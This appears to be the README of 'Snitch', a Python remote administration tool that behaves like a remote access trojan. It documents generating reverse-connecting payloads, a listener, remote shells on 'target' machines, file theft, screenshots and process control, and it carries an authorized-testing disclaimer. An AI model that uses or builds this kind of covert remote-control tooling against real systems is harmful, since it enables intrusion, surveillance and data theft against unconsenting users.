# Snitch Python 3.13 - Remote Administration Tool

A modern, secure Python 3.13 compatible remote administration tool with unique AES encryption per installation.

## 🚀 Features

- **Modern Python 3.13 Support**: Full compatibility with latest Python features and type hints
- **Unique AES Encryption**: Each installation generates cryptographically unique 32-byte keys
- **Cross-Platform**: Windows optimized, supports macOS and Linux
- **Secure by Default**: No hardcoded keys, proper input validation, comprehensive error handling
- **Interactive Shell**: Full remote shell access with file operations
- **System Information**: Comprehensive system monitoring and control
- **Payload Generation**: Multiple payload types (Python, PowerShell, Batch, Executable)
- **Professional Logging**: Structured logging with timestamps and levels

## 📋 Requirements

- **Python 3.13+** (Required)
- **Windows** (optimized), macOS, or Linux
- Dependencies listed in `win_requirements.txt`

## 🛠️ Installation

1. **Clone or download** this repository
2. **Install dependencies**:
   ```bash
   pip install -r win_requirements.txt
   ```
3. **Run Snitch**:
   ```bash
   python main.py
   ```

## 🎯 Quick Start

### Starting the Server
```
snitch> listen 4040
[SUCCESS] Server started on port 4040
[INFO] Waiting for connections...
```

### Generating Payloads
```
snitch> generate python 192.168.1.100 4040
[INFO] Generating python payload for 192.168.1.100:4040...
[SUCCESS] Payload generated: Payloads/snitch_payload_192.168.1.100_4040.py
```

### Managing Connections
```
snitch> sessions
Active Sessions (2):
 1. 192.168.1.50:4040 - Duration: 45s
 2. 192.168.1.75:4040 - Duration: 23s

snitch> shell 192.168.1.50
[INFO] Starting interactive shell with 192.168.1.50
192.168.1.50> dir
Directory of C:\Users\target
<DIR>          Desktop
<DIR>          Documents
     1,024     test.txt
```

## 🔐 AES Key Management

### Automatic Key Generation
Each installation automatically generates a **unique 32-byte AES key** using Python's `secrets` module:

```
snitch> showkey
Current AES Key Information:
--------------------------------------------------
Key (Base64): LxWkL/lQicJy0u/x6O3eERpGh1gzX2GM3cEom7oVVYw=
Abbreviation: 1e46c8c75a19f
Key Length: 32 bytes
Library Keys: 0
```

### Custom Keys
- **Environment Variable**: Set `Snitch_AES_KEY=<base64_key>`
- **Add to Library**: `addkey <base64_key>`
- **Generate New**: `genkey`

### Key Security
- Keys are **never hardcoded**
- Generated using cryptographically secure methods
- Automatically excluded from version control
- Each installation has a unique key

## 📚 Available Commands

### Server Management
| Command | Description |
|---------|-------------|
| `listen <port>` | Start server on specified port (default: 4040) |
| `stop` | Stop the server |
| `status` | Show server status |

### Connection Management
| Command | Description |
|---------|-------------|
| `sessions` | Show active client connections |
| `connect <ip> <port>` | Connect to remote payload |
| `disconnect <ip>` | Disconnect specific client |
| `history` | Show connection history |

### Remote Operations
| Command | Description |
|---------|-------------|
| `shell <ip>` | Interactive shell with client |
| `cmd <ip> <command>` | Execute single command |
| `sysinfo <ip>` | Get system information |
| `upload <ip> <local> <remote>` | Upload file to client |
| `download <ip> <remote> <local>` | Download file from client |
| `screenshot <ip>` | Take screenshot |
| `processes <ip>` | List running processes |
| `kill <ip> <pid>` | Kill process by PID |
| `lock <ip>` | Lock client screen |

### Payload Generation
| Command | Description |
|---------|-------------|
| `generate <type> <ip> <port>` | Generate payload (python, exe, powershell, batch) |
| `payloads` | List available payload types |

### Encryption Management
| Command | Description |
|---------|-------------|
| `showkey` | Display current AES key |
| `addkey <key>` | Add key to library |
| `listkeys` | Show all keys in library |
| `genkey` | Generate new random key |

## 🎯 Payload Types

### Python Payload
- **Full functionality** with all remote operations
- **Auto-reconnect** with configurable delays
- **Cross-platform** compatibility
- **Encrypted communications** using AES CFB mode

### PowerShell Payload
- **Windows-optimized** for native integration
- **Basic system information** gathering
- **Simple connection** establishment

### Batch Payload
- **Lightweight** Windows batch file
- **Basic system enumeration**
- **Minimal dependencies**

### Executable Payload
- **Compiled Python** payload (requires PyInstaller)
- **Self-contained** execution
- **Instructions provided** for compilation

## 🔒 Security Features

### Encryption
- **AES CFB mode** with random IV per message
- **32-byte keys** generated using `secrets.token_bytes()`
- **Length-prefixed messages** for integrity
- **Base64 encoding** for safe transmission

### Input Validation
- **IP address validation** for all network operations
- **Port range validation** (1-65535)
- **File path sanitization** for uploads/downloads
- **Command timeout protection**

### Error Handling
- **Comprehensive try-catch blocks** with meaningful messages
- **Graceful connection failure** handling
- **Automatic cleanup** of resources
- **Structured logging** for debugging

## 📁 Project Structure

```
Snitch_Python313/
├── main.py                          # Single entry point
├── README.md                        # This file
├── win_requirements.txt             # Dependencies
├── .gitignore                       # Git exclusions
├── test_snitch.py                   # Test suite
├── Application/
│   ├── Snitch_cmd.py               # Command handling
│   ├── Snitch_lib.py               # Communication library
│   ├── Snitch_utils.py             # Utilities and encryption
│   ├── Snitch_winshell.py          # Windows shell interface
│   ├── Snitch_help.py              # Help system
│   ├── Snitch_gen.py               # Payload generation
│   ├── Snitch_pyld_config.py       # Payload configuration
│   └── Snitch_Vars/
│       ├── globals.py              # Global constants
│       ├── st_aes.py               # Auto-generated AES key (git-ignored)
│       └── st_aes_lib.ini          # AES key library (git-ignored)
├── Logs/                           # Application logs (git-ignored)
├── Downloads/                      # Downloaded files (git-ignored)
├── Uploads/                        # Uploaded files (git-ignored)
├── Payloads/                       # Generated payloads (git-ignored)
├── Temp/                           # Temporary files (git-ignored)
├── Configuration/                  # Config files (git-ignored)
├── Tools/                          # Additional tools
└── PyLib/                          # Python libraries
```

## 🧪 Testing

Run the test suite to verify installation:

```bash
python test_snitch.py
```

Expected output:
```
Snitch Python 3.13 - Test Suite
========================================
Testing AES key generation...
✅ Key generated successfully!
Testing encryption/decryption...
✅ Encryption successful
✅ Decryption successful - data matches!
Testing payload generation...
✅ Python payload generated
========================================
Tests passed: 3/3
🎉 All tests passed!
```

## 🚨 Legal Notice

**This tool is for educational and authorized testing purposes only.**

- Only use on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal
- Users are responsible for compliance with local laws and regulations
- The authors assume no liability for misuse of this software

## 🔧 Troubleshooting

### Common Issues

**"Failed to import required modules"**
- Install dependencies: `pip install -r win_requirements.txt`
- Ensure Python 3.13+ is installed

**"No AES key available"**
- Check file permissions in `Application/Snitch_Vars/`
- Verify the directory is writable

**"Connection failed"**
- Check firewall settings
- Verify IP address and port
- Ensure payload is running on target

### Environment Variables

- `Snitch_AES_KEY`: Custom AES key (Base64 encoded, 32 bytes)
- `SNITCH_LOG_LEVEL`: Logging level (DEBUG, INFO, WARNING, ERROR)

## 📝 Version History

### v1.0.0 (Current)
- Initial release with Python 3.13 support
- Unique AES key generation per installation
- Cross-platform payload generation
- Comprehensive command interface
- Professional logging and error handling

---

**Made with ❤️ for cybersecurity education and authorized testing**